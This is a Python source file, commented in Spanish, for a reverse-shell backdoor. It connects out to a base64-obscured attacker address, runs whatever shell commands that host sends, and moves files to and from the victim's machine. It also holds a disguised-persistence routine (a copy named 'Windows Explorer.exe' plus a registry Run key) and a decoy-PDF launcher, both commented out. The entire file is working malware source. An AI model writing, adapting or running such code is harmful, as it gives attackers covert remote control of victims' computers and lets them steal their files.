import base64
import socket
import subprocess
import json
import os
import shutil
import sys
import struct

class Backdoor:
    def __init__(self, ip, port):
        d_ip = self.decode(ip)
        d_port = self.decode(port)
        #self.becomePersistent()
        self.BUFFER_SIZE = 4096
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((bytes(d_ip, 'utf-8'), int(d_port))) #La víctima establece conexión con la computadora atacante

    def becomePersistent(self):
        fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
        if not os.path.exists(fileLocation):
            shutil.copyfile(sys.executable, fileLocation)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
    
    def decode(self, string):
        return base64.b64decode(string.encode()).decode()
    
    #Codificación json:
    def reliableSend(self, data):
        if isinstance(data, bytes):
            jsonData = json.dumps(data.decode('utf-8', 'replace'))            
        else:
            jsonData = json.dumps(data)

        self.connection.sendall(bytes(jsonData, 'utf-8'))

    #Decodificación json:
    def reliableRecieve(self):
        jsonData = ''
        while True:
        #Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
        #De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
        #Así aseguramos la integridad de los mismos.
            '''try:
                jsonData = self.connection.recv(4096)                
                return json.loads(jsonData.decode('utf-8'))
            
            except ValueError: 
                print('Está ocurriendo un error')
                continue'''
            jsonData = self.connection.recv(4096)                
            return json.loads(jsonData)
    
    def runCommand(self, command):
        try:
            return subprocess.check_output(command, shell=True)
            
        except subprocess.CalledProcessError:
            return '[-]Comado no reconocido o error en el valor de salida'

    def changeDirectory(self, path):
        try:
            os.chdir(path)
            return f'[+]Cambiando a {path}'

        except (FileNotFoundError, OSError): 
            return '[-]El sistema no puede encontrar la ruta especificada'
    
    
    def receive_file_size(self, sck: socket.socket):
        # Esta función se asegura de que se reciban los bytes
        # que indican el tamaño del archivo que será enviado,
        # que es codificado por el cliente vía struct.pack(),
        # función la cual genera una secuencia de bytes que
        # representan el tamaño del archivo.
        fmt = "<Q"
        expected_bytes = struct.calcsize(fmt)
        received_bytes = 0
        stream = bytes()
        while received_bytes < expected_bytes:
            chunk = sck.recv(expected_bytes - received_bytes)
            stream += chunk
            received_bytes += len(chunk)
        filesize = struct.unpack(fmt, stream)[0]
        return filesize

    def receive_file(self, sck: socket.socket, filename, route):
        # Leer primero del socket la cantidad de 
        # bytes que se recibirán del archivo.
        filesize = self.receive_file_size(sck)
        # Abrir un nuevo archivo en donde guardar
        # los datos recibidos.
        filename = os.path.basename(filename)
        with open(f'{route}{filename}', "wb") as f:
            mensaje = '[+]Archivo enviado con éxito'
            received_bytes = 0
            # Recibir los datos del archivo en bloques de
            # 1024 bytes hasta llegar a la cantidad de
            # bytes total informada por el cliente.
            while received_bytes < filesize:
                chunk = sck.recv(1024)
                if chunk and not (b'no encononontrado' in chunk):                    
                    f.write(chunk)
                    received_bytes += len(chunk)
                else:
                    mensaje = '[-]Descarga fallida o archivo no encontrado'
                    break
        return mensaje
    
    def send_file(self, sck: socket.socket, filename):
        try:
            # Obtener el tamaño del archivo a enviar.
            filesize = os.path.getsize(filename)
            # Informar primero al servidor la cantidad
            # de bytes que serán enviados.
            sck.sendall(struct.pack("<Q", filesize))
            # Enviar el archivo en bloques de 1024 bytes.
            with open(filename, "rb") as f:
                while read_bytes := f.read(1024):
                    sck.sendall(read_bytes)
        except FileNotFoundError:
            sck.sendall(b'[-]Archivo no encononontrado')
    
    def run(self):
        try:
            while True: #Permite al programa ejecutarse indefinidamente
                command = self.reliableRecieve()
                if command[0] == 'salir':
                    self.connection.close()
                    exit()

                elif command[0] == 'cd' and len(command) > 1:
                    commandResults = self.changeDirectory(' '.join(command[1:]))

                elif command[0] == 'down':
                    commandResults = self.send_file(self.connection, ' '.join(command[2:]))

                elif command[0] == 'up':
                    filename = os.path.basename(' '.join(command[2:]))
                    commandResults = self.receive_file(self.connection, filename, command[1])

                else: 
                    commandResults = self.runCommand(command)
                    
                self.reliableSend(commandResults)

        except KeyboardInterrupt:
            self.reliableSend(b'El cliente ha finalizado la conexion')
            self.connection.close()
            print('\nConexión finalizada')
            
#file_name = sys._MEIPASS + '\Historias_de_usuario.pdf'
#subprocess.Popen(file_name, shell= True)

try: 
    backdoor = Backdoor('MTkyLjE2OC4xLjE0', 'NDQ0NA==')
    backdoor.run()
except:
    sys.exit()
